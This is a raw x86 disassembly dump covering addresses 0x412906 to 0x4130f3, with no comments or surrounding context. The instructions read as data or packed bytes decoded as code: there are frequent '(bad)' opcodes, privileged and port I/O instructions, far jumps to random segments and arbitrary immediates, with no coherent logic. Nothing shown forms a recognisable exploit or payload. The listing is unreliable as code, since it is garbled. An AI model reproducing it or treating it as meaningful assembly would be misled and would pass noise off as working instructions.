  412906:	gs sub ebx,esi
  412909:	and    dh,cl
  41290b:	push   cs
  41290c:	imul   esi,DWORD PTR [eax+0xfef0786],0x16
  412913:	mov    dl,0x6b
  412915:	pop    ecx
  412916:	adc    BYTE PTR [ebp+ecx*1+0x24],ah
  41291a:	out    0x57,al
  41291c:	gs add eax,0x4f9967b6
  412922:	test   ecx,esi
  412924:	imul   edx,DWORD PTR [edx],0x8b1f40f4
  41292a:	dec    esi
  41292b:	mov    edx,0x7c9cacf7
  412930:	and    ch,cl
  412932:	test   DWORD PTR [ecx+ecx*1-0x5817cf6a],ecx
  412939:	jle    0x412900
  41293b:	data16 shl cl,cl
  41293e:	mov    dl,0x11
  412940:	push   ecx
  412941:	and    esp,DWORD PTR [ecx-0x57]
  412944:	inc    esi
  412945:	out    dx,eax
  412946:	or     eax,0x86509c35
  41294b:	in     eax,dx
  41294c:	mov    ebp,0xa9f0a48c
  412951:	ficom  DWORD PTR [esi+eiz*1]
  412954:	mov    ecx,0x7985d44d
  412959:	adc    ecx,DWORD PTR [ecx-0x1edec74f]
  41295f:	adc    DWORD PTR [eax],ecx
  412961:	xor    BYTE PTR [ebp-0x4e],ch
  412964:	mov    esi,0xaa2fc56d
  412969:	icebp  
  41296a:	add    al,bl
  41296c:	bound  esi,QWORD PTR [ecx+0x1da6a1d9]
  412972:	xor    eax,0x86448873
  412977:	aaa    
  412978:	add    eax,esi
  41297a:	js     0x4129e3
  41297c:	mov    BYTE PTR [esi],bh
  41297e:	xchg   ebx,eax
  41297f:	push   es
  412980:	jbe    0x412992
  412982:	call   0x25e226e1
  412987:	sub    BYTE PTR ds:0x8c2a3e63,dl
  41298d:	icebp  
  41298e:	or     cl,BYTE PTR [eax-0x71]
  412991:	(bad)  
  412992:	sub    edi,DWORD PTR [edx+eax*4]
  412995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412996:	stos   DWORD PTR es:[edi],eax
  412997:	mov    ebp,esp
  412999:	repnz xchg ebp,ecx
  41299c:	mov    al,0xd8
  41299e:	out    dx,eax
  41299f:	xor    DWORD PTR [ebx],ebp
  4129a1:	lea    esp,[eax+ebp*1-0x7698913d]
  4129a8:	adc    BYTE PTR [eax-0x64],al
  4129ab:	jo     0x412968
  4129ad:	mov    WORD PTR [ebx+eax*8-0x35b90f0c],es
  4129b4:	les    ecx,FWORD PTR [ecx+0x3c68d6d9]
  4129ba:	and    al,0x13
  4129bc:	sub    esi,DWORD PTR [ebp+0x18342386]
  4129c2:	dec    ebp
  4129c3:	imul   ebp,ebp,0xf127e29d
  4129c9:	mov    cl,0x64
  4129cb:	push   ss
  4129cc:	xchg   esi,eax
  4129cd:	adc    ecx,eax
  4129cf:	call   0x4abf:0x7587b9f0
  4129d6:	cmp    DWORD PTR [esi],ebx
  4129d8:	sbb    DWORD PTR [edi],esp
  4129da:	imul   DWORD PTR [eax]
  4129dc:	jnp    0x4129c1
  4129de:	enter  0x8ba,0x86
  4129e2:	adc    cl,BYTE PTR es:[esi]
  4129e5:	push   cs
  4129e6:	inc    ebp
  4129e7:	aas    
  4129e8:	cmp    al,0xcf
  4129ea:	retf   0x7bfa
  4129ed:	or     al,0xaf
  4129ef:	push   edi
  4129f0:	or     BYTE PTR [ebp+edi*8+0x2a4167b8],bl
  4129f7:	sbb    DWORD PTR [eax],ecx
  4129f9:	pop    eax
  4129fa:	aaa    
  4129fb:	data16 and al,0xb7
  4129fe:	mov    eax,0xe2f1b572
  412a03:	jbe    0x412a78
  412a05:	popf   
  412a06:	mov    ch,0x20
  412a08:	test   ch,al
  412a0a:	cmp    ebx,ebx
  412a0c:	push   ebx
  412a0d:	push   0xdba16d86
  412a12:	mov    DWORD PTR ss:[edx+esi*8],edx
  412a16:	fs rcl eax,1
  412a19:	sub    ecx,DWORD PTR [edx+0x60b09544]
  412a1f:	mov    esp,0x75ab1e08
  412a24:	add    cl,BYTE PTR [eax-0x47]
  412a27:	add    al,0x59
  412a29:	mov    DWORD PTR [esi-0x2c444e04],edi
  412a2f:	mov    cl,0x41
  412a31:	pop    es
  412a32:	ins    DWORD PTR es:[edi],dx
  412a33:	adc    ebp,DWORD PTR [esi]
  412a35:	js     0x412a5c
  412a37:	mov    fs,WORD PTR es:[eax+0x7]
  412a3b:	into   
  412a3c:	ss sysret 
  412a3f:	mov    BYTE PTR ds:0x68bd874d,bh
  412a45:	push   edi
  412a46:	cwde   
  412a47:	int    0xcb
  412a49:	fnstcw WORD PTR [eax+ebp*1-0x1c]
  412a4d:	retf   0x362d
  412a50:	imul   DWORD PTR [ecx-0x58]
  412a53:	jl     0x412aca
  412a55:	mov    ebx,0xf06d0bc2
  412a5a:	jmp    0xc8e7:0xc92ea39e
  412a61:	push   es
  412a62:	call   0x11d5:0x8773cc50
  412a69:	xor    dl,BYTE PTR ds:0xea13bd80
  412a6f:	sub    DWORD PTR [ebx+edi*8+0x48],edi
  412a73:	mov    cs,WORD PTR [eax]
  412a75:	enter  0x4c0,0xa6
  412a79:	mov    ds:0xf07294e1,al
  412a7e:	pop    esp
  412a7f:	(bad)  
  412a80:	jg     0x412a12
  412a82:	dec    ebp
  412a83:	cwde   
  412a84:	out    dx,eax
  412a85:	cwde   
  412a86:	xchg   ebp,eax
  412a87:	or     DWORD PTR ss:[edx+0x52],esi
  412a8b:	xchg   edx,eax
  412a8c:	inc    eax
  412a8d:	sub    al,0x89
  412a8f:	mov    al,ds:0xa2bcef54
  412a94:	jne    0x412a31
  412a96:	lahf   
  412a97:	pop    ebx
  412a98:	dec    ecx
  412a99:	mov    bl,al
  412a9b:	leave  
  412a9c:	push   0x55
  412a9e:	mov    al,ds:0x87dd90d2
  412aa3:	scas   eax,DWORD PTR es:[edi]
  412aa4:	es xor ah,cl
  412aa7:	jns    0x412a7e
  412aa9:	(bad)
  412aac:	inc    ecx
  412aad:	sbb    BYTE PTR [esi],ch
  412aaf:	mov    edx,0x6dd5f07f
  412ab4:	xlat   BYTE PTR ds:[ebx]
  412ab5:	or     eax,0xdfc92831
  412aba:	mov    esi,esp
  412abc:	cmp    esp,ebx
  412abe:	pop    esp
  412abf:	sub    DWORD PTR [eax+0x9129962],ecx
  412ac5:	cmp    al,0x81
  412ac7:	pop    edi
  412ac8:	(bad)  
  412aca:	and    al,0x2
  412acc:	div    BYTE PTR [ecx]
  412ace:	pop    ecx
  412acf:	pop    ss
  412ad0:	sbb    eax,0x119826f0
  412ad5:	or     BYTE PTR [esp+ebp*8+0x5271b619],0x13
  412add:	jnp    0x412a65
  412adf:	dec    ebp
  412ae0:	ret    
  412ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ae2:	jp     0x412b18
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jl     0x412a88
  412ae7:	daa    
  412ae8:	mov    ebp,ebp
  412aea:	scas   eax,DWORD PTR es:[edi]
  412aeb:	lock or DWORD PTR [ecx+0x5a],ebp
  412aef:	test   al,cl
  412af1:	out    dx,eax
  412af2:	xchg   ecx,eax
  412af3:	lahf   
  412af4:	data16 mov ds:0xdc1729b8,al
  412afa:	pop    es
  412afb:	xor    al,BYTE PTR [ecx]
  412afd:	lock jo 0x412ad1
  412b00:	xchg   ecx,eax
  412b01:	xor    al,0xa2
  412b03:	push   esi
  412b04:	mov    bl,0xa
  412b07:	(bad)  
  412b08:	aam    0x74
  412b0a:	adc    DWORD PTR [edi-0x314a9ee6],0xd704f08e
  412b14:	dec    ecx
  412b15:	jmp    0x5c69:0x674b8ed4
  412b1c:	pushf  
  412b1d:	icebp  
  412b1e:	(bad)  
  412b1f:	cmp    eax,0xf8c4c519
  412b24:	xor    ecx,esi
  412b26:	add    dh,BYTE PTR es:[ecx]
  412b29:	push   ds
  412b2a:	and    DWORD PTR ds:0xe25d0dad,edi
  412b30:	out    0x1a,al
  412b32:	lea    ecx,[edi]
  412b34:	pop    es
  412b35:	shr    DWORD PTR [esi],1
  412b37:	mov    ds:0x85060a48,al
  412b3c:	popf   
  412b3d:	imul   ecx,DWORD PTR [ebx+0x29],0x20
  412b41:	aam    0x47
  412b43:	or     DWORD PTR [esi],0xffffffd6
  412b46:	xor    BYTE PTR [ecx+0x469dafea],cl
  412b4c:	sbb    DWORD PTR [esi-0x6bf267ac],0x5e
  412b53:	sub    BYTE PTR [esi],bl
  412b55:	xor    edi,DWORD PTR [ecx]
  412b57:	mov    dh,0x9
  412b59:	push   0xc645ffb4
  412b5e:	lds    edi,FWORD PTR [esi]
  412b60:	push   esi
  412b61:	lock xor ah,bh
  412b64:	add    eax,0x9e64bc89
  412b69:	stc    
  412b6a:	jl     0x412bd0
  412b6c:	out    dx,al
  412b6d:	xor    eax,DWORD PTR [ecx+0x6f320ebd]
  412b73:	inc    edi
  412b74:	mov    bh,0x23
  412b76:	aam    0x76
  412b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b79:	jp     0x412b1f
  412b7b:	sub    BYTE PTR [eax],dh
  412b7d:	or     eax,0xebf7317d
  412b82:	mov    ch,0x56
  412b84:	nop
  412b85:	mov    eax,0xf2e6b812
  412b8a:	mov    ah,ch
  412b8c:	mov    ah,0x47
  412b8e:	xchg   edx,eax
  412b8f:	and    ah,BYTE PTR [ecx+0x78]
  412b92:	sbb    eax,0x444e51cd
  412b97:	mov    cl,0x9
  412b99:	aam    0x2f
  412b9b:	mov    ds,WORD PTR [ecx+0x5a]
  412b9e:	int3   
  412b9f:	fs sub eax,0x5dc44af0
  412ba5:	jmp    0x412bec
  412ba7:	sahf   
  412ba8:	jmp    0x87e2:0x53f2a4a4
  412baf:	adc    DWORD PTR [ecx],ebx
  412bb1:	int3   
  412bb2:	test   BYTE PTR ds:0x29785247,0x48
  412bb9:	cmp    BYTE PTR [ecx+0x4b],cl
  412bbc:	dec    eax
  412bbd:	add    edi,ebp
  412bbf:	test   DWORD PTR ds:0x645b7d8,edx
  412bc5:	lock addr16 icebp 
  412bc8:	ror    BYTE PTR [edi-0x11d610f5],cl
  412bce:	(bad)  
  412bcf:	sub    BYTE PTR [ebx-0x44],cl
  412bd2:	xchg   DWORD PTR [esi],ebx
  412bd4:	or     BYTE PTR [eax],bh
  412bd6:	and    edx,DWORD PTR [ecx+0x6bc00f]
  412bdc:	loope  0x412bce
  412bde:	xor    ch,BYTE PTR [edx+eax*4-0x6d3d7c10]
  412be5:	mov    BYTE PTR [ecx],bl
  412be7:	sbb    eax,0x459b3c03
  412bec:	mov    bl,0xbc
  412bee:	aad    0x52
  412bf0:	pusha  
  412bf1:	lahf   
  412bf2:	xchg   BYTE PTR [ebp-0x6113790],bl
  412bf8:	daa    
  412bf9:	neg    DWORD PTR [ebx-0x49]
  412bfc:	test   BYTE PTR [ebx-0x45],ch
  412bff:	dec    edi
  412c00:	pop    ds
  412c01:	inc    eax
  412c02:	gs fadd st,st(1)
  412c05:	cmp    DWORD PTR [ebx],0xffffff9e
  412c08:	pop    esi
  412c09:	sub    DWORD PTR [ecx+ecx*2+0x2040742],eax
  412c10:	retf   
  412c11:	lock inc esi
  412c13:	aas    
  412c14:	mov    cl,0xfe
  412c16:	sbb    al,0xf8
  412c18:	or     ebx,eax
  412c1a:	retf   0x77cb
  412c1d:	cld    
  412c1e:	xchg   ecx,ebx
  412c20:	ins    DWORD PTR es:[edi],dx
  412c21:	cs in  al,0x8
  412c24:	mov    edi,0xe0dc6088
  412c29:	lock sub BYTE PTR [esi-0x26],ah
  412c2d:	sti    
  412c2e:	fld    DWORD PTR ds:0x18cd5214
  412c34:	or     DWORD PTR [eax+0x7e],ecx
  412c37:	fucom  st(1)
  412c39:	mov    ecx,0xfba1a5c3
  412c3e:	lods   al,BYTE PTR ds:[esi]
  412c3f:	cmp    al,0x84
  412c41:	push   ds
  412c42:	out    0x4d,eax
  412c44:	sbb    DWORD PTR [edi-0xd0a56fc],edi
  412c4a:	mov    bl,0xc3
  412c4c:	adc    DWORD PTR [edi+eax*4-0x17],edi
  412c50:	pop    esp
  412c51:	or     BYTE PTR [ecx],al
  412c53:	fadd   QWORD PTR [esi-0x4f6eadb2]
  412c59:	dec    ebx
  412c5a:	call   0xf742:0x479bd1e3
  412c61:	scas   eax,DWORD PTR es:[edi]
  412c62:	call   0x1d7ec3d1
  412c67:	mov    cl,0x55
  412c69:	lock push edx
  412c6b:	fidivr WORD PTR [edi]
  412c6d:	fild   QWORD PTR [ebx+0x31]
  412c70:	adc    cl,ah
  412c72:	and    esi,edi
  412c74:	cld    
  412c75:	xor    cl,BYTE PTR [ecx+0x551421b1]
  412c7b:	push   esi
  412c7c:	ins    DWORD PTR es:[edi],dx
  412c7d:	xchg   ebp,eax
  412c7e:	push   es
  412c7f:	pushf  
  412c80:	retf   0xe0a0
  412c83:	cdq    
  412c84:	pushf  
  412c85:	cmp    al,0x87
  412c87:	push   edi
  412c88:	loopne 0x412cb5
  412c8a:	adc    al,0x65
  412c8c:	fst    QWORD PTR [ecx]
  412c8e:	xchg   DWORD PTR [ebp-0x7e],eax
  412c91:	(bad)  
  412c93:	fldenv [ebx-0x12d79bde]
  412c99:	cwde   
  412c9a:	push   edx
  412c9b:	mov    edi,0xaf73f329
  412ca0:	or     esp,DWORD PTR [eax-0x1077f8d]
  412ca6:	sub    dh,al
  412ca8:	loopne 0x412cb3
  412caa:	dec    ebx
  412cab:	adc    ecx,DWORD PTR [ebx]
  412cad:	hlt    
  412cae:	addr16 aaa 
  412cb0:	ja     0x412c6b
  412cb2:	push   ss
  412cb3:	push   ss
  412cb4:	adc    eax,0x3598c5ea
  412cb9:	jecxz  0x412c41
  412cbb:	mov    bh,0x2c
  412cbd:	adc    eax,esp
  412cbf:	cmp    eax,0x299c621b
  412cc4:	pop    edi
  412cc5:	mov    WORD PTR ds:0x625a0c26,fs
  412ccb:	test   BYTE PTR [esi+edi*8],ch
  412cce:	xchg   ebp,eax
  412ccf:	in     al,dx
  412cd0:	adc    BYTE PTR [ebp-0x7987d607],bl
  412cd6:	(bad)
  412cda:	fld    QWORD PTR fs:[eax]
  412cdd:	push   eax
  412cde:	lea    edi,[ebx+0x77]
  412ce1:	das    
  412ce2:	jmp    0xda09:0xe4f18c57
  412ce9:	push   edx
  412cea:	jmp    0xb2ecff8a
  412cef:	jne    0x412d09
  412cf1:	test   eax,0x9ce2d986
  412cf6:	mov    DWORD PTR [edi+0x28ad22ab],ecx
  412cfc:	fsub   QWORD PTR [ebp+0x8086ef1]
  412d02:	jl     0x412c95
  412d04:	out    dx,al
  412d05:	inc    esp
  412d06:	sbb    ah,BYTE PTR [ebx+0x46]
  412d09:	repz (bad) 
  412d0c:	dec    ecx
  412d0d:	dec    eax
  412d0e:	mov    cl,0x35
  412d10:	out    0x39,al
  412d12:	cmc    
  412d13:	or     al,0x8
  412d15:	xor    BYTE PTR [edx],ch
  412d17:	xor    BYTE PTR [eax-0x7b3b0fd],bh
  412d1d:	icebp  
  412d1e:	and    ah,BYTE PTR [edi]
  412d20:	push   es
  412d21:	mov    dl,0xd0
  412d23:	aad    0x93
  412d25:	mov    edi,0xd2081101
  412d2a:	addr16 mov cl,0xdf
  412d2d:	rol    DWORD PTR ds:0xf0ef4001,0xbe
  412d34:	sbb    BYTE PTR fs:[eax],cl
  412d37:	and    DWORD PTR [ebx-0x62],ebx
  412d3a:	push   es
  412d3b:	inc    eax
  412d3c:	or     BYTE PTR [esi],ch
  412d3e:	sbb    al,0x16
  412d40:	int    0x6d
  412d42:	or     DWORD PTR [ecx-0x70],0xfffffff1
  412d46:	inc    edx
  412d47:	rcl    DWORD PTR [esi],1
  412d49:	ret    
  412d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d4b:	call   0x404f75d1
  412d50:	inc    eax
  412d51:	xor    ah,BYTE PTR [ebx-0x1d]
  412d54:	or     eax,edi
  412d56:	in     eax,0xa5
  412d58:	jl     0x412d74
  412d5a:	jmp    0x4aad7290
  412d5f:	cs icebp 
  412d61:	dec    edi
  412d62:	mov    ecx,0x4549dc20
  412d67:	and    al,BYTE PTR [edi]
  412d69:	scas   al,BYTE PTR es:[edi]
  412d6a:	push   0xffffff9c
  412d6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d6d:	fsubp  st(7),st
  412d6f:	and    eax,0x5ba766f8
  412d74:	div    DWORD PTR [esi]
  412d76:	mov    esi,0x5f141f28
  412d7b:	jo     0x412d85
  412d7d:	(bad)  
  412d7e:	fs sbb eax,0x1e8d324c
  412d84:	iret   
  412d85:	lock add ah,BYTE PTR [edi]
  412d88:	adc    eax,0x66578fd3
  412d8d:	shl    DWORD PTR [ebp-0x34f302f0],0x31
  412d94:	jmp    0x2ea9:0x937f878e
  412d9b:	mov    ds:0x86d2f6fd,eax
  412da0:	sub    al,BYTE PTR [ebp-0x684c3a39]
  412da6:	data16 sbb BYTE PTR [edi],bh
  412da9:	jmp    0xe21a1b35
  412dae:	push   ss
  412daf:	sub    BYTE PTR [ebp-0x6],bl
  412db2:	and    ebp,DWORD PTR [ecx]
  412db4:	and    edi,DWORD PTR [esi+0x69]
  412db7:	sub    al,0xa8
  412db9:	sub    dh,0x35
  412dbc:	or     BYTE PTR [edx],bl
  412dbe:	pop    edx
  412dbf:	ds daa 
  412dc1:	fstp   QWORD PTR [ebx+0x18d7572f]
  412dc7:	int    0x1e
  412dc9:	lock lods eax,DWORD PTR cs:[esi]
  412dcc:	sbb    dh,BYTE PTR [eax]
  412dce:	dec    esi
  412dcf:	inc    eax
  412dd0:	or     BYTE PTR [esi],al
  412dd2:	sbb    dh,ah
  412dd4:	stos   BYTE PTR es:[edi],al
  412dd5:	test   BYTE PTR [esi],al
  412dd7:	jle    0x412e03
  412dd9:	lock mov ds,WORD PTR [ecx+0x54]
  412ddd:	aad    0xe0
  412ddf:	test   BYTE PTR [edx-0x7a],al
  412de2:	dec    esi
  412de3:	xor    edx,DWORD PTR [edx-0x299a7927]
  412de9:	(bad)  
  412dea:	push   esp
  412deb:	out    0xed,al
  412ded:	sub    cl,BYTE PTR [ebp+0x28]
  412df0:	rcr    BYTE PTR [eax+0x40ab2af],cl
  412df6:	pushf  
  412df7:	ins    DWORD PTR es:[edi],dx
  412df8:	mov    edi,ds
  412dfa:	popaw  
  412dfc:	loop   0x412d8f
  412dfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dff:	arpl   WORD PTR [esp+ebx*8+0x26aa2866],bp
  412e06:	cmp    ebp,DWORD PTR [esi]
  412e08:	lahf   
  412e09:	pop    esi
  412e0a:	xchg   DWORD PTR [ebp+0x7f],edx
  412e0d:	icebp  
  412e0e:	neg    BYTE PTR [ebx]
  412e10:	retf   
  412e11:	or     eax,0xd31a9231
  412e16:	mov    edi,0x80eef829
  412e1b:	fistp  DWORD PTR [edi]
  412e1d:	icebp  
  412e1e:	scas   al,BYTE PTR es:[edi]
  412e1f:	cs push ds
  412e21:	push   ebx
  412e22:	stos   DWORD PTR es:[edi],eax
  412e23:	inc    esp
  412e24:	or     ah,BYTE PTR [edx+0x11]
  412e27:	mov    edx,0x71ca04e0
  412e2c:	xchg   edx,eax
  412e2d:	sub    edi,edx
  412e2f:	sub    DWORD PTR [esi+0x2c],esi
  412e32:	dec    ch
  412e34:	mov    DWORD PTR [ecx-0x63],edx
  412e37:	sub    ch,ch
  412e39:	add    eax,DWORD PTR [edx+0x64]
  412e3c:	or     edi,esi
  412e3e:	sbb    eax,0x6147b9d
  412e43:	xor    al,0xe7
  412e45:	imul   ecx,DWORD PTR [esi],0xc57c5b6f
  412e4b:	sub    esi,DWORD PTR [esi-0x3]
  412e4e:	inc    ebp
  412e4f:	aam    0x21
  412e51:	push   eax
  412e52:	aad    0xf3
  412e54:	div    ecx
  412e56:	call   0x15b641c2
  412e5b:	ja     0x412e8f
  412e5d:	icebp  
  412e5e:	hlt    
  412e5f:	jnp    0x412ebe
  412e61:	inc    edi
  412e62:	sub    bl,bh
  412e64:	test   bl,dl
  412e66:	das    
  412e67:	mov    ebp,DWORD PTR [eax-0x10]
  412e6a:	cld    
  412e6b:	icebp  
  412e6c:	(bad)  
  412e6d:	(bad)  
  412e6e:	mov    BYTE PTR [ebp+0x1],al
  412e71:	lock xor dl,BYTE PTR [esi-0x9816916]
  412e78:	add    esi,esi
  412e7a:	ror    dl,0x92
  412e7d:	aaa    
  412e7e:	mov    edi,0x38ef089b
  412e83:	call   0xe7183b8e
  412e88:	and    esi,ecx
  412e8a:	xchg   esp,eax
  412e8b:	cmc    
  412e8c:	mov    al,ds:0x3619c990
  412e91:	jbe    0x412e5a
  412e93:	fidivr WORD PTR ds:0x79d187d1
  412e99:	daa    
  412e9a:	test   al,0x75
  412e9c:	dec    ebp
  412e9d:	outs   dx,DWORD PTR gs:[esi]
  412e9f:	pop    ebp
  412ea0:	int    0x1d
  412ea2:	xchg   DWORD PTR [ebx],edi
  412ea4:	test   DWORD PTR [edx+0x53],edi
  412ea7:	pop    eax
  412ea8:	mov    al,ds:0x5efb81fa
  412ead:	and    DWORD PTR [ebx],0xf11440
  412eb3:	ins    DWORD PTR es:[edi],dx
  412eb4:	add    esi,ebp
  412eb6:	sbb    BYTE PTR [esi],0x64
  412eb9:	fs enter 0xfc12,0x82
  412ebe:	xchg   ecx,eax
  412ebf:	shl    DWORD PTR [edx-0x14],cl
  412ec2:	and    BYTE PTR [edi],ah
  412ec4:	sub    al,0x8a
  412ec6:	(bad)  
  412ec7:	dec    ecx
  412ec8:	int    0x6e
  412eca:	pop    esp
  412ecb:	daa    
  412ecc:	popa   
  412ecd:	lock cmp esp,DWORD PTR [esi+0x73]
  412ed1:	dec    edx
  412ed2:	stos   DWORD PTR es:[edi],eax
  412ed3:	jp     0x412e5d
  412ed5:	(bad)
  412ed9:	push   esp
  412eda:	and    eax,0xaf6607e
  412edf:	in     eax,dx
  412ee0:	in     al,dx
  412ee1:	jns    0x412e8a
  412ee3:	out    dx,al
  412ee4:	leave  
  412ee5:	loope  0x412e76
  412ee7:	loope  0x412efc
  412ee9:	xchg   esp,eax
  412eea:	xchg   BYTE PTR [eax+edi*4+0x70],al
  412eee:	pop    ss
  412eef:	adc    eax,0x3459bf71
  412ef4:	jne    0x412f1f
  412ef6:	mov    ch,0x2d
  412ef8:	test   al,0x73
  412efa:	out    0x20,eax
  412efc:	(bad)  
  412efd:	and    BYTE PTR [esi+0x5],al
  412f00:	xor    bl,dl
  412f02:	mov    DWORD PTR [ebx+0x12ea23c8],ebx
  412f08:	cmp    ch,dh
  412f0a:	out    0x85,al
  412f0c:	shr    edx,cl
  412f0e:	xor    dl,ah
  412f10:	iret   
  412f11:	cmp    edi,eax
  412f13:	mov    esp,0x37420e08
  412f18:	xlat   BYTE PTR ds:[ebx]
  412f19:	push   0xffffffc4
  412f1b:	or     BYTE PTR [ecx],0xf1
  412f1e:	add    BYTE PTR [ebx-0x2b3fd912],ah
  412f24:	pusha  
  412f25:	or     DWORD PTR [ecx],edx
  412f27:	add    eax,0xef8c1ffa
  412f2c:	or     BYTE PTR ds:0xf05618e3,dh
  412f32:	stos   BYTE PTR es:[edi],al
  412f33:	lods   eax,DWORD PTR ds:[esi]
  412f34:	out    dx,al
  412f35:	dec    ebx
  412f36:	dec    ebx
  412f37:	leave  
  412f38:	enter  0x2ead,0x61
  412f3c:	adc    al,0xcb
  412f3e:	or     DWORD PTR ds:0x722a8052,0x67ca5608
  412f48:	cdq    
  412f49:	(bad)  [edx]
  412f4b:	and    esi,DWORD PTR [edi]
  412f4d:	add    BYTE PTR ds:0x883a89a1,cl
  412f53:	std    
  412f54:	out    0xb1,al
  412f56:	pop    edi
  412f57:	ret    
  412f58:	inc    ecx
  412f59:	lock jle 0x412f4c
  412f5c:	xor    ch,BYTE PTR [ebp+0x13]
  412f5f:	imul   esi,edx,0xe
  412f62:	sub    esi,DWORD PTR [esp+esi*2+0x401d872a]
  412f69:	inc    ebx
  412f6a:	fcmovnbe st,st(4)
  412f6c:	stos   BYTE PTR es:[edi],al
  412f6d:	icebp  
  412f6e:	xor    ch,cl
  412f70:	sbb    al,BYTE PTR [esi-0x10fbc680]
  412f76:	mov    ch,0x98
  412f78:	or     DWORD PTR [esi],esp
  412f7a:	mov    ds:0x6593789b,ax
  412f80:	cwde   
  412f81:	lock int3 
  412f83:	shl    bh,cl
  412f85:	mov    ah,0x6c
  412f87:	or     ecx,DWORD PTR [ecx-0x7b]
  412f8a:	adc    edx,esi
  412f8c:	or     DWORD PTR [edx],eax
  412f8e:	je     0x412f89
  412f90:	push   cs
  412f91:	lds    ecx,FWORD PTR [ecx+0x52f09e1b]
  412f97:	sub    DWORD PTR [edi-0x55],ebp
  412f9a:	call   0xf5f72744
  412f9f:	int    0x8
  412fa1:	loopne 0x413019
  412fa3:	jmp    0x68c6e03
  412fa8:	in     al,0xef
  412faa:	xor    ch,BYTE PTR [ecx]
  412fac:	mov    al,0x4d
  412fae:	xchg   DWORD PTR [bx+si+0x15],esi
  412fb2:	mov    bh,0xf7
  412fb5:	mov    bl,0x94
  412fb7:	push   cs
  412fb8:	mov    eax,0x66ad7aa1
  412fbd:	icebp  
  412fbe:	jl     0x412f96
  412fc0:	mov    ecx,0x41f153ac
  412fc5:	das    
  412fc6:	sbb    ebx,DWORD PTR [edx+0x298649fc]
  412fcc:	pusha  
  412fcd:	pop    ss
  412fce:	pop    ebx
  412fcf:	mov    dh,0x91
  412fd1:	fwait
  412fd2:	test   al,0x29
  412fd4:	retf   
  412fd5:	xchg   edi,eax
  412fd6:	mov    esp,0xd10df747
  412fdb:	imul   esi,DWORD PTR [eax-0x8],0xf522dab
  412fe2:	(bad)  
  412fe3:	xchg   ebp,eax
  412fe4:	fistp  WORD PTR [edx-0x177dd767]
  412fea:	fcmovu st,st(7)
  412fec:	or     BYTE PTR [edx+0x53],bh
  412fef:	cmp    DWORD PTR [ecx+edx*1+0x2f],ecx
  412ff3:	adc    cl,BYTE PTR [edi-0xf]
  412ff6:	xchg   BYTE PTR [eax],ah
  412ff8:	repnz push es
  412ffa:	enter  0x9d35,0x87
  412ffe:	ret    0x21c5
  413001:	jb     0x412f88
  413003:	das    
  413004:	stc    
  413005:	mov    esp,0xf033f6f2
  41300a:	ss je  0x413084
  41300d:	loopne 0x41307b
  41300f:	pop    es
  413010:	bound  edi,QWORD PTR [ebx+0x66]
  413013:	mov    BYTE PTR [edx],cl
  413015:	es push ebx
  413017:	clc    
  413018:	inc    esp
  413019:	or     ebp,ebx
  41301b:	mov    esp,0xf33b47c9
  413020:	mov    cl,0x88
  413022:	add    BYTE PTR [eax],ch
  413024:	xchg   edx,eax
  413025:	and    al,0x1b
  413027:	cmc    
  413028:	jmp    0x87ad:0xc0d72130
  41302f:	pop    edi
  413030:	jo     0x413097
  413032:	lock jnp 0x41308c
  413035:	inc    ebx
  413036:	scas   eax,DWORD PTR es:[edi]
  413037:	sub    DWORD PTR [esi],esp
  413039:	arpl   WORD PTR [ecx+0x35],cx
  41303c:	test   DWORD PTR [ecx+0x3c75267f],0xcacc0a2a
  413046:	cld    
  413047:	jae    0x4130b4
  413049:	sub    al,0xe5
  41304b:	ins    DWORD PTR es:[edi],dx
  41304c:	idiv   edi
  41304e:	std    
  41304f:	pop    esp
  413050:	jecxz  0x413038
  413052:	mov    cl,0xc6
  413054:	or     BYTE PTR [esi+ebp*8+0x474f43a1],cl
  41305b:	mov    cl,0x79
  41305d:	cli    
  41305e:	dec    esp
  41305f:	retf   0x555f
  413062:	mov    dl,0xb2
  413064:	mov    BYTE PTR [ebp-0x7a],0x28
  413068:	or     BYTE PTR [esi],cl
  41306a:	nop
  41306b:	jno    0x413038
  41306d:	test   al,0x56
  41306f:	jnp    0x4130cc
  413071:	sbb    BYTE PTR [ebx+0x78],ah
  413074:	aaa    
  413075:	jp     0x413049
  413077:	sub    BYTE PTR [ebx],bh
  413079:	loopne 0x4130a6
  41307b:	mov    ebp,0xa70fcf2
  413080:	ja     0x41307a
  413082:	call   0xdb28:0x4caf7233
  413089:	lea    esi,[esi+eax*2]
  41308c:	mul    DWORD PTR [edx-0x4c]
  41308f:	jo     0x41305b
  413091:	or     BYTE PTR [edx],ah
  413093:	jne    0x4130cd
  413095:	and    dh,dl
  413097:	ror    BYTE PTR [ebp-0x7c7d2a89],cl
  41309d:	inc    eax
  41309e:	pop    edx
  41309f:	sub    BYTE PTR [ebp+0x7],al
  4130a2:	mov    dl,0xe5
  4130a4:	(bad)  
  4130a6:	sub    al,BYTE PTR [ebx]
  4130a8:	dec    ebx
  4130a9:	pop    eax
  4130aa:	xchg   DWORD PTR [ecx],edi
  4130ac:	xchg   edi,eax
  4130ad:	rol    dh,cl
  4130af:	or     ax,0x36f5
  4130b3:	sub    BYTE PTR [esi-0x37941f1a],bl
  4130b9:	adc    eax,0x5a91c557
  4130be:	xchg   DWORD PTR [ecx-0x6f],edx
  4130c1:	adc    cl,al
  4130c3:	fwait
  4130c4:	inc    edi
  4130c5:	lods   eax,DWORD PTR ds:[esi]
  4130c6:	aad    0x29
  4130c8:	dec    edx
  4130c9:	mov    edx,DWORD PTR [ecx+0x34fc020e]
  4130cf:	cmp    eax,0xa55085be
  4130d4:	dec    esp
  4130d5:	in     eax,0x6
  4130d7:	inc    edx
  4130d8:	jecxz  0x413081
  4130da:	movaps XMMWORD PTR [ecx-0x44],xmm5
  4130de:	mov    ch,0xf9
  4130e0:	cld    
  4130e1:	xlat   BYTE PTR ds:[ebx]
  4130e2:	cmp    ecx,esp
  4130e4:	mov    al,0xc
  4130e6:	xchg   BYTE PTR [ecx-0x43],al
  4130e9:	push   0x49
  4130eb:	push   esi
  4130ec:	xchg   DWORD PTR [edi+0x7ccd293c],ebx
  4130f2:	push   eax
  4130f3:	dec    esi
